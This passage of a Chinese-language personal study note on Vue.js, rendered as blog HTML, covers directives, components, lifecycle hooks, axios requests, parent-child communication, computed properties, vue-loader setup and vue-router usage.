alt=\"image-20220123225202839\"></p>\n<p>v-model花式玩法</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123225844114.png\" alt=\"image-20220123225844114\"></p>\n<p>修饰符</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123230448443.png\" alt=\"image-20220123230448443\"></p>\n</li>\n<li><p>绑定属性，绑定方法，双向绑定内容</p>\n</li>\n<li><p>v-once 只update一次，无法被修改</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-once</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li><p>v-pre 直接输出不渲染，v-cloak解决显示源码问题</p>\n</li>\n<li><p>可以通过在methods写一个方法返回字符串赋值给某个属性比如</p>\n</li>\n</ol>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-bind:class</span>=<span class=\"string\">&quot;getClasses()&quot;</span>&gt;</span></span><br><span class=\"line\">    记得要加小括号哦</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">\tel...</span></span><br><span class=\"line\"><span class=\"javascript\">    data....,</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"attr\">methods</span>:&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"attr\">getClasses</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span> &#123;<span class=\"attr\">active</span>:<span class=\"built_in\">this</span>.isActive,<span class=\"attr\">linw</span>:<span class=\"built_in\">this</span>.isLine&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Vue组件\"><a href=\"#Vue组件\" class=\"headerlink\" title=\"Vue组件\"></a>Vue组件</h2><p>自定义组件，使用时必须放在vue控制的标签下</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vue.component(<span class=\"string\">&quot;gggxxx&quot;</span>,&#123;</span><br><span class=\"line\">    <span class=\"attr\">props</span>:[<span class=\"string\">&#x27;参数名&#x27;</span>]</span><br><span class=\"line\">    <span class=\"attr\">template</span>:<span class=\"string\">&#x27;&lt;li&gt;hello&lt;/li&gt;&#x27;</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>比如,这个app必须被接管</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;test&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">gggxxx</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;item in items&quot;</span> <span class=\"attr\">v-bind:</span>参数名=<span class=\"string\">&quot;item&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">gggxxx</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>items必须在vue的data区声明</p>\n<h2 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h2><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/11370083-f279314aef6741db.jpg\" alt=\"img\" style=\"zoom:80%;\" />\n\n<img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/13119812-5890a846b6efa045.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n<p>一共8个，分别是实例</p>\n<ul>\n<li>创建前，创建后</li>\n<li>挂载数据前，挂载数据后（可以做axios操作）</li>\n<li>更新数据前，更新数据后</li>\n<li>摧毁实例前，摧毁实例后 （用的比较少）</li>\n</ul>\n<p>vue为我们在这几个阶段添加了hook点，我们可以实现不同阶段的方法达到所需要的效果    </p>\n<h2 id=\"axios\"><a href=\"#axios\" class=\"headerlink\" title=\"axios\"></a>axios</h2><p>注意匿名函数使得this指向发生改变</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">_this = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">axios.get(<span class=\"string\">&quot;https://autumnfish.cn/api/joke/list?num=93&quot;</span>).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">response</span>)</span>&#123;</span><br><span class=\"line\">               <span class=\"built_in\">console</span>.log(response.data.jokes);</span><br><span class=\"line\">           &#125;,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>)</span>&#123;</span><br><span class=\"line\">               <span class=\"built_in\">console</span>.log(err)</span><br><span class=\"line\">         &#125;)</span><br><span class=\"line\">axios.post(<span class=\"string\">&quot;https://autumnfish.cn/api/user/reg&quot;</span>,&#123;<span class=\"attr\">username</span>:<span class=\"string\">&quot;盐焗西蓝花&quot;</span>&#125;).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">response</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(response.data.jokes);</span><br><span class=\"line\">&#125;,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(err)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//es6 箭头函数</span></span><br><span class=\"line\"></span><br><span class=\"line\">axios.get(<span class=\"string\">&quot;url&quot;</span>).then(<span class=\"function\">(<span class=\"params\">response</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(response)</span><br><span class=\"line\">&#125;).catch(<span class=\"function\"><span class=\"params\">error</span>=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//另一种写法,相当于调用axios构造方法并传入一个对象参数</span></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">    <span class=\"attr\">url</span>:<span class=\"string\">&quot;url&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">methods</span>:<span class=\"string\">&quot;post&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">data</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">dataList</span>:[]</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;).then(<span class=\"function\">(<span class=\"params\">response</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    doSomething();</span><br><span class=\"line\">&#125;).catch(<span class=\"function\">(<span class=\"params\">error</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    doOtherthing();</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"组件化开发\"><a href=\"#组件化开发\" class=\"headerlink\" title=\"组件化开发\"></a>组件化开发</h2><p>整个vue实例相当于一个根组件</p>\n<ol>\n<li>先声明 Vue.extend({template})</li>\n<li>再注册 Vue.compoment(使用名称,’组件名称’)</li>\n<li>使用（必须在绑定了vue的标签下使用）</li>\n</ol>\n<p>语法糖组件</p>\n<p>注册原理一样</p>\n<h4 id=\"全局组件\"><a href=\"#全局组件\" class=\"headerlink\" title=\"全局组件\"></a>全局组件</h4><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vue.component(<span class=\"string\">&#x27;gggxxxooo&#x27;</span>,&#123;</span><br><span class=\"line\">    <span class=\"attr\">template</span>:</span><br><span class=\"line\">        <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h1&gt;我是标题1&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h2&gt;我是标题2&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h3&gt;我是标题3&lt;/h3&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;cpnC&gt;&lt;/cpnC&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;cpnC&gt;&lt;/cpnC&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;aaag&gt;&lt;/aaag&gt;</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\">        &lt;/div&gt;`</span>,</span><br><span class=\"line\">    <span class=\"attr\">components</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">aaag</span>:cpnC</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"私有组件\"><a href=\"#私有组件\" class=\"headerlink\" title=\"私有组件\"></a>私有组件</h4><p>直接在vue实例模板内部注册时写上</p>\n<h3 id=\"模板分离\"><a href=\"#模板分离\" class=\"headerlink\" title=\"模板分离\"></a>模板分离</h3><ol>\n<li>使用<code>&lt;script type=&quot;text/x-template&quot; id=&quot;cpn&quot;&gt;&lt;/script&gt;</code>,在里面书写模板内容，然后注册时直接template=”#cpn”</li>\n<li>使用<code>&lt;template id=&quot;#cpn&quot;&gt;&lt;template&gt;</code>,在里面书写模板内容，然后注册时直接template=”#cpn”</li>\n</ol>\n<h3 id=\"插槽slot的使用\"><a href=\"#插槽slot的使用\" class=\"headerlink\" title=\"插槽slot的使用\"></a>插槽slot的使用</h3><p>方便拓展</p>\n<p>在需要的地方<code>&lt;slot&gt;&lt;/slot&gt;</code>,使用模板时直接<code>&lt;模板名&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/模板名&gt;</code></p>\n<p>具名插槽</p>\n<h3 id=\"全局组件与私有组件\"><a href=\"#全局组件与私有组件\" class=\"headerlink\" title=\"全局组件与私有组件\"></a>全局组件与私有组件</h3><p>全局在vue实例外注册，私有组件在vue实例中注册</p>\n<p>全局组件可以在多个vue实例中使用，私有组件只能在注册的vue实例中使用   </p>\n<h3 id=\"父子组件\"><a href=\"#父子组件\" class=\"headerlink\" title=\"父子组件\"></a>父子组件</h3><p>父组件必须注册子组件后才可以使用，在template后面写components属性</p>\n<p>爷爷组件无法找到孙子组件，需要注册过才可以使用</p>\n<h3 id=\"父子组件的通信\"><a href=\"#父子组件的通信\" class=\"headerlink\" title=\"父子组件的通信\"></a>父子组件的通信</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220209140734709.png\" alt=\"image-20220209140734709\"></p>\n<h4 id=\"父传子\"><a href=\"#父传子\" class=\"headerlink\" title=\"父传子\"></a>父传子</h4><p>通过props向子组件传递数据</p>\n<ul>\n<li><p>在子组件中的props属性中声明变量（即形参）比如<code>props:[&#39;cmovies&#39;]</code></p>\n</li>\n<li><p>在使用时比如<code>&lt;cpn :cmovies=父组件中需要传递的变量&gt;&lt;/cpn&gt;</code>中赋值</p>\n</li>\n<li><p>然后在子组件的template中使用cmovies</p>\n</li>\n</ul>\n<p>props还可以写成对象的形式,具备以下功能</p>\n<ul>\n<li>限制类型，</li>\n<li>提供默认值,类型是数组或者对象时，默认值必须是函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">props:&#123;</span><br><span class=\"line\">    <span class=\"attr\">cmovies</span>:<span class=\"built_in\">Array</span>,</span><br><span class=\"line\">    <span class=\"attr\">cmessage</span>:<span class=\"built_in\">String</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"attr\">props</span>:&#123;</span><br><span class=\"line\">    <span class=\"attr\">cmovies</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">type</span>:<span class=\"built_in\">Array</span>,</span><br><span class=\"line\">        <span class=\"attr\">default</span>:<span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">require</span>:<span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>必须要使用v-bind/： 绑定否则cmovies会被当成属性名不生效    </p>\n<h4 id=\"子传父\"><a href=\"#子传父\" class=\"headerlink\" title=\"子传父\"></a>子传父</h4><p>通过事件向父组件发送消息</p>\n<ul>\n<li>子组件中监听事件</li>\n<li>在事件处理中发射携带·数据·</li>\n<li>父组件接收数据并处理</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">子组件\t</span><br><span class=\"line\">\t&lt;button  v-<span class=\"keyword\">for</span>=<span class=\"string\">&quot;category in categories&quot;</span> @click=<span class=\"string\">&quot;btnClick(category)&quot;</span>&gt;&#123;&#123;category.name&#125;&#125;&lt;/button&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t <span class=\"function\"><span class=\"title\">btnClick</span>(<span class=\"params\">category</span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 处理事务流;</span></span><br><span class=\"line\">            <span class=\"built_in\">this</span>.$emit(<span class=\"string\">&#x27;itemclick&#x27;</span>,category)</span><br><span class=\"line\">            <span class=\"comment\">// 处理事务流;</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">父组件</span><br><span class=\"line\">\t<span class=\"comment\">//其中itemclick为自定义</span></span><br><span class=\"line\">\t&lt;sftest @itemclick=<span class=\"string\">&quot;cpnClick&quot;</span>&gt;&lt;/sftest&gt;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">cpnClick</span>(<span class=\"params\">item</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 处理事务流;</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(item);</span><br><span class=\"line\">        <span class=\"comment\">// 处理事务流;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"vue对象属性\"><a href=\"#vue对象属性\" class=\"headerlink\" title=\"vue对象属性\"></a>vue对象属性</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220122180557019.png\" alt=\"image-20220122180557019\"></p>\n<h3 id=\"Vue定义data的两种方式，定义为属性或函数。\"><a href=\"#Vue定义data的两种方式，定义为属性或函数。\" class=\"headerlink\" title=\"Vue定义data的两种方式，定义为属性或函数。\"></a>Vue定义data的两种方式，定义为属性或函数。</h3><ol>\n<li><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220122214812234.png\" alt=\"image-20220122214812234\"></li>\n<li>​          <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220122215009370.png\" alt=\"image-20220122215009370\"></li>\n</ol>\n<p>区别： 在简单的vue实例应用中，三种写法几乎是没有什么区别的，因为你定义的#app对象不会被复用。但是如果是在组件应用的环境中，就可能会存在多个地方调用同一个组件的情况，为了不让多个地方的组件共享同一个data对象，只能返回函数。这个与JavaScript的作用域特性有关，函数自己拥有私有的作用域，函数之间的作用域相互独立，也就不会出现组件对数据的绑定出现交错的情况</p>\n<p>计算属性相当于缓存，是一个名词，调用时当属性调用后面不加括号，节约系统开销</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123114042264.png\" alt=\"image-20220123114042264\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220123120236143.png\" alt=\"image-20220123120236143\"></p>\n<p>methods和computed看起来都可以实现我们的功能，<br>那么为什么还要多一个计算属性这个东西呢？<br>原因：计算属性会进行缓存，如果多次使用时，计算属性只会调用一次，而methods会多次调用</p>\n<p>有两种写法，一般不写set,只读属性</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">computed:&#123;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"title\">fullName</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.firstName+<span class=\"string\">&quot; &quot;</span>+<span class=\"built_in\">this</span>.lastName;</span><br><span class=\"line\">       &#125;,</span><br><span class=\"line\">       <span class=\"attr\">fullName2</span>:&#123;</span><br><span class=\"line\">           <span class=\"attr\">set</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;,</span><br><span class=\"line\">           <span class=\"attr\">get</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">               <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.firstName+<span class=\"string\">&quot; &quot;</span>+<span class=\"built_in\">this</span>.lastName;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">components:&#123;</span><br><span class=\"line\">\t<span class=\"attr\">cpn</span>: cpnC  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//es6中可以直接写数据，如果属性名与数据一致的话</span></span><br><span class=\"line\"><span class=\"attr\">components</span>:&#123;</span><br><span class=\"line\">\tcpnC  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p> Vue的终极解决方案</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">  <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;btnClick1&quot;</span>&gt;</span>按钮<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">&lt;/template&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">  <span class=\"attr\">name</span>: <span class=\"string\">&quot;App&quot;</span>,</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">  <span class=\"function\"><span class=\"title\">data</span>(<span class=\"params\"></span>)</span>&#123;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">    <span class=\"keyword\">return</span> &#123;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">      <span class=\"attr\">message</span>:<span class=\"string\">&quot;hello webpack&quot;</span></span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">  &#125;,</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">  <span class=\"attr\">methods</span>:&#123;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">    <span class=\"function\"><span class=\"title\">btnClick1</span>(<span class=\"params\"></span>)</span>&#123;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\"></span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">  &#125;</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\">&#125;s</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"xml\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>npm install <strong>vue-loader</strong> <strong>vue-template-complier</strong> –save-dev</p>\n<p>编写rules </p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//作用的文件</span></span><br><span class=\"line\">    <span class=\"attr\">test</span>: <span class=\"regexp\">/\\.vue$/</span>,</span><br><span class=\"line\">    use: [<span class=\"string\">&#x27;vue-loader&#x27;</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>把index页面也当做一个组件</p>\n<h2 id=\"后端路由\"><a href=\"#后端路由\" class=\"headerlink\" title=\"后端路由\"></a>后端路由</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220212110500448.png\" alt=\"image-20220212110500448\"></p>\n<h2 id=\"前后端分离前端路由\"><a href=\"#前后端分离前端路由\" class=\"headerlink\" title=\"前后端分离前端路由\"></a>前后端分离前端路由</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220212112620174.png\" alt=\"image-20220212112620174\"></p>\n<h2 id=\"改变URL不刷新页面的方法\"><a href=\"#改变URL不刷新页面的方法\" class=\"headerlink\" title=\"改变URL不刷新页面的方法\"></a>改变URL不刷新页面的方法</h2><ul>\n<li>改变url的哈希<code>location.hash = &#39;foo&#39;</code></li>\n<li>html5中<code>history.pushState(&#123;&#125;,&#39;&#39;,&#39;/foo&#39;)</code>,<code>history.replaceState(&#123;&#125;,&#39;&#39;,&#39;&#39;/foo)</code>,栈原理，前者可以回溯，后者由于是代替无法回溯</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">history.go(<span class=\"number\">1</span>)     history.forward();</span><br><span class=\"line\">history.go(<span class=\"number\">1</span>)     history.back();</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"vue-router\"><a href=\"#vue-router\" class=\"headerlink\" title=\"vue-router\"></a>vue-router</h2><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220212114032652.png\" alt=\"image-20220212114032652\"></p>\n<p>router-link与router-view为全局组件，router-link默认渲染为为超链接，router-view作为占位符替换组件</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220212211646087.png\" alt=\"image-20220212211646087\"></p>\n<p>代码js路由</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;button @click=<span class=\"string\">&quot;myclick&quot;</span>&gt;我的&lt;/button&gt;</span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;yourclick&quot;</span>&gt;</span>你的<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\">methods:&#123;</span><br><span class=\"line\">    <span class=\"comment\">//push与replace区别是能否返回</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"title\">myclick</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">     <span class=\"built_in\">this</span>.$router.push(<span class=\"string\">&#x27;/home&#x27;</span>)</span><br><span class=\"line\">     <span class=\"built_in\">this</span>.$router.replace(<span class=\"string\">&#x27;/home&#x27;</span>)</span><br><span class=\"line\">     <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;my&#x27;</span>);</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   <span class=\"function\"><span class=\"title\">yourclick</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">     <span class=\"built_in\">this</span>.$router.push(<span class=\"string\">&#x27;/about&#x27;</span>)</span><br><span class=\"line\">     <span class=\"built_in\">this</span>.$router.replace(<span class=\"string\">&#x27;/about&#x27;</span>)</span><br><span class=\"line\">     <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;your&#x27;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>默认路由</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//空或者/</span></span><br><span class=\"line\">    <span class=\"attr\">path</span>:<span class=\"string\">&#x27;&#x27;</span>，</span><br><span class=\"line\">    <span class=\"attr\">redirect</span>:<span class=\"string\">&#x27;/home&#x27;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改哈希模式为history模式</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> Router = <span class=\"keyword\">new</span> VueRouter(&#123;</span><br><span class=\"line\">    routes,</span><br><span class=\"line\">    <span class=\"attr\">mode</span>:<span class=\"string\">&#x27;history&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>this.$router 对象是路由配置index.js中的router对象</p>\n<p>this.$route 对象是路由配置index.js中的routes对象中活跃的那一个(处于哪个状态就是哪一个)</p>\n<h3 id=\"动态路由（用户信息传参）\"><a href=\"#动态路由（用户信息传参）\" class=\"headerlink\" title=\"动态路由（用户信息传参）\"></a>动态路由（用户信息传参）</h3><p>通过v-bind绑定userId，在路由时</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">path</span>: <span class=\"string\">&#x27;/user/:id&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">component</span>: User</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>&lt;router-link :to=&quot;&#39;/user/&#39;+userId&quot;&gt;用户&lt;/router-link&gt;</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">计算属性取url参数</span><br><span class=\"line\"><span class=\"attr\">computed</span>:&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">userId</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.$route.params.id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;p&gt;&#123;&#123;userId&#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">或者直接写</span><br><span class=\"line\">&lt;p&gt;&#123;&#123;$route.params.id&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"打包后的js文件\"><a href=\"#打包后的js文件\" class=\"headerlink\" title=\"打包后的js文件\"></a>打包后的js文件</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213101014114.png\" alt=\"image-20220213101014114\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213100123123.png\" alt=\"image-20220213100123123\"></p>\n<p>让打包后的文件不压缩保持缩进把webpack.prod.conf.jszh的UglifyJsPlugin插件关闭</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> UglifyJsPlugin(&#123;</span><br><span class=\"line\">      <span class=\"attr\">uglifyOptions</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">compress</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">warnings</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">sourceMap</span>: config.build.productionSourceMap,</span><br><span class=\"line\">      <span class=\"attr\">parallel</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;),</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"嵌套路由\"><a href=\"#嵌套路由\" class=\"headerlink\" title=\"嵌套路由\"></a>嵌套路由</h3><ul>\n<li><p>创建子组件</p>\n</li>\n<li><p>路由编写规则,不用谢/，直接写路劲，会自动拼接，下面采用了懒加载</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//import Homenews from 